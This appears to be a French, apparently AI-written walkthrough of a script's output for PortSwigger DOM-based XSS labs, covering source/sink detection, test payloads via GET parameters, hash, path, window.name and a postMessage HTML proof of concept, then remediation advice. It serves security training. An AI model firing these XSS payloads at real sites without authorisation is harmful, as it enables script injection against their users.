#MANPAGE

Voici un **exemple exhaustif de l’exécution du script** pour tous les challenges DOM-based XSS PortSwigger, avec le détail de chaque phase (analyse, attaque, contrôle) et les résultats attendus pour chaque vecteur testé :

---

## Lancement du script

```bash
chmod +x script.sh
./script.sh
```

---

## Sortie typique et comportement séquentiel

### 1. Analyse statique automatique

```
------------------------------------------------------
[Analyse] Détection automatique des sources/sinks DOM XSS dans le code source...
  [!] Source détectée : location.search
  [!] Sink détecté : document.write
  [!] Sink détecté : innerHTML
  => Pour une analyse dynamique, ouvrez la page dans Burp Suite DOM Invader ou le navigateur (voir [1][6]).
```
*Le script inspecte le HTML/JS de la page cible et liste les sources/sinks DOM XSS trouvées (ex : `location.search`, `document.write`, `innerHTML`), ce qui indique les vecteurs à privilégier pour l’attaque[1][2][4][8].*

---

### 2. Test via paramètres GET (`location.search`, `innerHTML`, etc.)

```
------------------------------------------------------
[Vecteur 1] DOM XSS via paramètres GET (location.search, innerHTML, etc.)
  [+] Payload reflété pour search : https://<your-lab>.web-security-academy.net/?search=%3Cscript%3Ealert('domxss')%3C%2Fscript%3E
      => POTENTIELLEMENT VULNÉRABLE (payload retrouvé dans la réponse HTML)
  [-] Payload non reflété pour q : https://<your-lab>.web-security-academy.net/?q=%3Cscript%3Ealert('domxss')%3C%2Fscript%3E
  ...
  [Contrôle dynamique] : Ouvrez les liens reflétant le payload dans un navigateur ou Burp DOM Invader pour valider l’exécution JS côté client[1][4][6][8].
```
*Le script injecte chaque payload XSS dans chaque paramètre courant et vérifie si le payload est reflété dans la réponse HTML. Si oui, il signale la vulnérabilité potentielle. Il recommande ensuite de valider l’exécution réelle dans un navigateur ou Burp DOM Invader[1][4][6][8].*

---

### 3. Test via hash/fragment (`location.hash`)

```
------------------------------------------------------
[Vecteur 2] DOM XSS via hash/fragment (location.hash, etc.)
  [!] La page lit location.hash. Testez dynamiquement : https://<your-lab>.web-security-academy.net/#<img src=x onerror=alert('hashdomxss')>
      => POTENTIELLEMENT VULNÉRABLE
  [Contrôle dynamique] : Ouvrez les liens dans un navigateur ou Burp DOM Invader pour valider l’exécution du payload[1][6].
```
*Le script détecte l’utilisation de `location.hash` et propose des liens de test à ouvrir dans le navigateur. Si l’alerte JS apparaît, la faille est confirmée[1][6].*

---

### 4. Test via path (`location.pathname`)

```
------------------------------------------------------
[Vecteur 3] DOM XSS via path (location.pathname, etc.)
  [-] Payload non reflété dans le path : https://<your-lab>.web-security-academy.net/<img src=x onerror=alert('pathdomxss')>
  [Contrôle dynamique] : Ouvrez les liens reflétant le payload dans un navigateur pour valider l’exécution JS[1][6].
```
*Le script teste si le payload injecté dans le path est reflété dans la réponse. Si oui, il recommande de valider dans le navigateur.*

---

### 5. Test via window.name

```
------------------------------------------------------
[Vecteur 4] DOM XSS via window.name
  [!] La page lit window.name. Testez dynamiquement dans la console JS :
      window.name='<img src=x onerror=alert('namedomxss')>'; window.location='https://<your-lab>.web-security-academy.net';
      => POTENTIELLEMENT VULNÉRABLE
  [Contrôle dynamique] : Exécutez la commande ci-dessus dans la console JS du navigateur et observez l’exécution du payload[1][6].
```
*Le script détecte l’utilisation de `window.name` et propose une commande JS à exécuter dans la console du navigateur pour valider l’exploitabilité.*

---

### 6. Test via postMessage

```
------------------------------------------------------
[Vecteur 5] DOM XSS via postMessage
  [!] La page utilise postMessage. Testez dynamiquement avec la PoC suivante :
<!DOCTYPE html>
<html>
  <body>
    <script>
      var target = window.open("https://<your-lab>.web-security-academy.net", "targetWin");
      setTimeout(function() {
        target.postMessage("<img src=x onerror=alert('postmsgdomxss')>", "*");
      }, 1000);
    </script>
  </body>
</html>
      => POTENTIELLEMENT VULNÉRABLE
  [Contrôle dynamique] : Ouvrez la PoC HTML dans un navigateur et observez l’exécution du payload dans la page cible[1][6].
```
*Le script détecte l’utilisation de postMessage, génère une PoC HTML à tester, et explique comment valider la faille.*

---

### 7. Conseils/remédiation

```
------------------------------------------------------
[Remédiation & Conseils]
- Si un payload est reflété ou exécutable côté client, la page est probablement vulnérable à une DOM XSS.
- Pour corriger :
  * N’utilisez jamais de données non filtrées issues de l’URL ou du DOM dans des sinks dangereux (innerHTML, document.write, etc.).
  * Préférez textContent à innerHTML.
  * Utilisez Trusted Types si possible.
  * Analysez le JS avec ESLint (plugin Mozilla).
- Pour confirmation, ouvrez la page dans Burp Suite DOM Invader ou le navigateur et testez les PoC générés.
- Documentation PortSwigger : https://portswigger.net/web-security/cross-site-scripting/dom-based
```
*Le script termine par un rappel des bonnes pratiques de remédiation et des outils de validation dynamique (Burp DOM Invader, navigateur)[1][6].*

---

### 8. Synthèse finale

```
------------------------------------------------------
[SYNTHÈSE]
1. Le script a analysé le code source à la recherche de sources/sinks DOM XSS.
2. Il a testé chaque vecteur (GET, hash, path, window.name, postMessage) et contrôlé si le payload est exploitable.
3. Pour confirmation, ouvrez les liens/PoC dans un navigateur ou Burp DOM Invader.
4. Appliquez les recommandations de remédiation si une faille est trouvée.
------------------------------------------------------
```

---
